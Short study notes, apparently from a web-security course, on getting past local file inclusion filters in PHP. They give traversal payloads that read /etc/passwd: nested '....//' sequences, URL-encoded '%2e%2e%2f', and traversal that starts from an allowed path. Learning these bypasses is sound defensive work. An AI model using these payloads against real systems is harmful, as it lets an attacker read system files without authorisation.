# LFI Bypass Techniques – Notes

## 1. Non-Recursive Filters

### Problem
Filters remove "../" once:
```php
str_replace('../', '', input);
```

### Bypass
Use recursive payload:
```
....//....//etc/passwd
```

---

## 2. Encoding Bypass

### Problem
Filter blocks "." and "/"

### Solution
URL encode:
```
../ → %2e%2e%2f
```

### Payload
```
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

## 3. Approved Path Bypass

### Problem
Only allow:
```
./languages/
```

### Solution
Start with allowed path:
```
./languages/../../../../etc/passwd
```

---

## 4. Appended Extension

### Problem
```php
include(input . ".php");
```

### Effect
```
/etc/passwd → /etc/passwd.php
```

### Note
- Hard to bypass in modern PHP
- Possible in old versions

---

## 5. Key Takeaways

- Filters can be bypassed
- Combine techniques
- Encoding + traversal = powerful
